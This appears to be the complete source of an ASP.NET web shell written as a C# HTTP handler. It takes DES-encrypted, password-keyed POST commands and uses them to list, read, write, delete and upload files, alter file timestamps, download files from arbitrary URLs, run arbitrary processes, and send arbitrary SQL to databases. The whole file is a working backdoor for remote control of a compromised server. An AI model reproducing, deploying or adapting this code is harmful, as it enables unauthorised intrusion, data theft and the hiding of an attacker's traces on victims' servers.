using System;
using System.Web;
using System.IO;
using System.Text;
using System.Data;
using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;


public class Handler : IHttpHandler
{
    public String pwd = "x";
    public String cs = "UTF-8";
    public String key = "KvCb2poU";// des key 请尽量不要使用默认key
    public String Z = "";
    public String Z1 = "";
    public String Z2 = "";
    public String Z3 = "";
    public String R = "";
    public void ProcessRequest(HttpContext context)
    {
        string ct = decryptForDES(HttpUtility.UrlDecode(PostInput(context.Request.InputStream)),key);
        //String ct = DESDecode(PostInput(context.Request.InputStream),key);
        splitdata(ct);
        if (Z != "")
        {
            try
            {
                switch (Z)
                {
                    case "A":
                        {
                            String[] c = Directory.GetLogicalDrives();
                            R = String.Format("{0}\t", context.Server.MapPath("/"));
                            for (int i = 0; i < c.Length; i++)
                                R += c[i][0] + ":";
                            break;
                        }
                    case "B":
                        {
                            DirectoryInfo m = new DirectoryInfo(Z1);
                            foreach (DirectoryInfo D in m.GetDirectories())
                            {
                                R += String.Format("{0}/\t{1}\t0\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                            }
                            foreach (FileInfo D in m.GetFiles())
                            {
                                R += String.Format("{0}\t{1}\t{2}\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"), D.Length);
                            }
                            break;
                        }
                    case "C":
                        {
                            StreamReader m = new StreamReader(Z1, Encoding.GetEncoding(cs));
                            R = m.ReadToEnd();
                            m.Close();
                            break;
                        }
                    case "D":
                        {
                            StreamWriter m = new StreamWriter(Z1, false, Encoding.GetEncoding(cs));
                            m.Write(Z2);
                            R = "1";
                            m.Close();
                            break;
                        }
                    case "E":
                        {
                            if (Directory.Exists(Z1))
                            {
                                Directory.Delete(Z1, true);
                            }
                            else
                            {
                                File.Delete(Z1);
                            }
                            R = "1";
                            break;
                        }
                    case "F":
                        {
                            context.Response.Clear();
                            context.Response.Write("X@Y");
                            context.Response.WriteFile(Z1);
                            context.Response.Write("X@Y");
                            goto End;
                        }
                    case "G":
                        {
                            String P = Z1;
                            byte[] B = new Byte[Z2.Length / 2];
                            for (int i = 0; i < Z2.Length; i += 2)
                            {
                                B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                            }
                            FileStream fs = new FileStream(Z1, FileMode.Create);
                            fs.Write(B, 0, B.Length);
                            fs.Close();
                            R = "1";
                            break;
                        }
                    case "H":
                        {
                            CP(Z1, Z2, context);
                            R = "1";
                            break;
                        }
                    case "I":
                        {
                            if (Directory.Exists(Z1))
                            {
                                Directory.Move(Z1, Z2);
                            }
                            else
                            {
                                File.Move(Z1, Z2);
                            }
                            R = "1";
                            break;
                        }
                    case "J":
                        {
                            Directory.CreateDirectory(Z1);
                            R = "1";
                            break;
                        }
                    case "K":
                        {
                            DateTime TM = Convert.ToDateTime(Z2);
                            if (Directory.Exists(Z1))
                            {
                                Directory.SetCreationTime(Z1, TM);
                                Directory.SetLastWriteTime(Z1, TM);
                                Directory.SetLastAccessTime(Z1, TM);
                            }
                            else
                            {
                                File.SetCreationTime(Z1, TM);
                                File.SetLastWriteTime(Z1, TM);
                                File.SetLastAccessTime(Z1, TM);
                            }
                            R = "1";
                            break;
                        }
                    case "L":
                        {
                            HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1));
                            RQ.Method = "GET";
                            RQ.ContentType = "application/x-www-form-urlencoded";
                            HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
                            Stream WF = WB.GetResponseStream();
                            FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write);
                            int i;
                            byte[] buffer = new byte[1024];
                            while (true)
                            {
                                i = WF.Read(buffer, 0, buffer.Length);
                                if (i < 1)
                                {
                                    break;
                                }
                                FS.Write(buffer, 0, i);
                            }
                            WF.Close();
                            WB.Close();
                            FS.Close();
                            R = "1";
                            break;
                        }
                    case "M":
                        {
                            String cmdPara = Z1.Substring(0,2);
                            String cmdexec = Z1.Substring(2);
                            ProcessStartInfo c = new ProcessStartInfo(cmdexec);
                            Process e = new Process();
                            StreamReader OT, ER;
                            c.UseShellExecute = false;
                            c.RedirectStandardInput = true;
                            c.RedirectStandardOutput = true;
                            c.RedirectStandardError = true;
                            c.CreateNoWindow = true;
                            e.StartInfo = c;
                            c.Arguments = cmdPara +" " + Z2;
                            e.Start();
                            OT = e.StandardOutput;
                            ER = e.StandardError;
                            e.Close();
                            R = OT.ReadToEnd() + ER.ReadToEnd();
                            break;
                        }
                    case "N":
                        {
                            System.Data.DataSet ds = new System.Data.DataSet();
                            String strCon = Z1;
                            string sql = "show databases";
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t", "\t", false);
                            }
                            break;
                        }
                    case "O":
                        {
                            String strCon = Z1, strDb = Z2;
                            System.Data.DataSet ds = new System.Data.DataSet();
                            string sql = "show tables from " + strDb;
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t", "\t", false);
                            }
                            break;
                        }
                    case "P":
                        {
                            String strCon = Z1, strDb = Z2, strTable = Z3;
                            System.Data.DataSet ds = new System.Data.DataSet();
                            string sql = "select * from " + strDb + "." + strTable + " limit 0,0";
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t", "", true);
                            }
                            break;
                        }
                    case "Q":
                        {
                            String strCon = Z1, sql = Z2;
                            System.Data.DataSet ds = new System.Data.DataSet();
                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                            {
                                dataAdapter.Fill(ds);
                                R = parseDataset(ds, "\t|\t", "\r\n", true);
                            }
                            break;
                        }
                    default: goto End;
                }
            }
            catch (Exception E)
            {
                R = "ERROR:// " + E.Message.ToString();
            }
            context.Response.Write(encryptForDES("X@Y" + R + "X@Y",key));
        End:;
        }
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }

    public void CP(String S, String D, HttpContext context)
    {
        if (Directory.Exists(S))
        {
            DirectoryInfo m = new DirectoryInfo(S);
            Directory.CreateDirectory(D);
            foreach (FileInfo F in m.GetFiles())
            {
                File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
            }
            foreach (DirectoryInfo F in m.GetDirectories())
            {
                CP(S + "\\" + F.Name, D + "\\" + F.Name, context);
            }
        }
        else
        {
            File.Copy(S, D);
        }
    }
    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2), System.Globalization.NumberStyles.HexNumber))));
        }
        return sb.ToString();
    }


    public string parseDataset(DataSet ds, String columnsep, String rowsep, bool needcoluname)
    {
        if (ds == null || ds.Tables.Count <= 0)
        {
            return "Status" + columnsep + rowsep + "True" + columnsep + rowsep;
        }
        StringBuilder sb = new StringBuilder();
        if (needcoluname)
        {
            for (int i = 0; i < ds.Tables[0].Columns.Count; i++)
            {
                sb.AppendFormat("{0}{1}", ds.Tables[0].Columns[i].ColumnName, columnsep);
            }
            sb.Append(rowsep);
        }
        foreach (DataTable dt in ds.Tables)
        {
            foreach (DataRow dr in dt.Rows)
            {
                for (int i = 0; i < dr.Table.Columns.Count; i++)
                {
                    sb.AppendFormat("{0}{1}", ObjToStr(dr[i]), columnsep);
                }
                sb.Append(rowsep);
            }
        }
        return sb.ToString();
    }

    public string ObjToStr(object ob)
    {
        if (ob == null)
        {
            return string.Empty;
        }
        else
            return ob.ToString();
    }
    //des 加密
    public string encryptForDES(string message, string key)
    {
        using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
        {
            byte[] inputByteArray = Encoding.UTF8.GetBytes(message);
            des.Key = UTF8Encoding.UTF8.GetBytes(key);
            des.IV = UTF8Encoding.UTF8.GetBytes(key);
            des.Mode = System.Security.Cryptography.CipherMode.ECB;
            System.IO.MemoryStream ms = new System.IO.MemoryStream();
            using (CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                cs.Close();
            }
            string str = Convert.ToBase64String(ms.ToArray());
            ms.Close();
            return str;
        }
    }
    //des 解密
    public string decryptForDES(string message, string key)
    {
        byte[] inputByteArray = Convert.FromBase64String(message);
        using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
        {
            des.Key = UTF8Encoding.UTF8.GetBytes(key);
            des.IV = UTF8Encoding.UTF8.GetBytes(key);
            des.Mode = System.Security.Cryptography.CipherMode.ECB;
            System.IO.MemoryStream ms = new System.IO.MemoryStream();
            using (CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write))
            {
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                cs.Close();
            }
            string str = Encoding.UTF8.GetString(ms.ToArray());
            ms.Close();
            return str;
        }
    }

    //获取post过来的数据
    public string PostInput(Stream st)
    {
        try
        {
            System.IO.Stream s = st;
            int count = 0;
            byte[] buffer = new byte[1024];
            StringBuilder builder = new StringBuilder();
            while ((count = s.Read(buffer, 0, 1024)) > 0)
            {
                builder.Append(Encoding.UTF8.GetString(buffer, 0, count));
            }
            s.Flush();
            s.Close();
            s.Dispose();
            return builder.ToString();
        }
        catch (Exception ex)
        {
            R = ex.ToString();
            return "";
        }
    }

    public void splitdata(string str)
    {
        string[] para = str.Split('&');
        for (int i=0;i<para.Length;i++)
        {
            String[] o = para[i].Split('=');
            if (o[0].Equals(pwd))
            {
                Z = o[1];
            } else if (o[0].Equals("z0")){
                cs = o[1];

            } else if (o[0].Equals("z1"))
            {
                Z1 = HttpUtility.UrlDecode(o[1]);
            } else if (o[0].Equals("z2"))
            {
                Z2 = HttpUtility.UrlDecode(o[1]);
            } else if (o[0].Equals("z3"))
            {
                Z3 = HttpUtility.UrlDecode(o[1]);
            }
        }
    }
}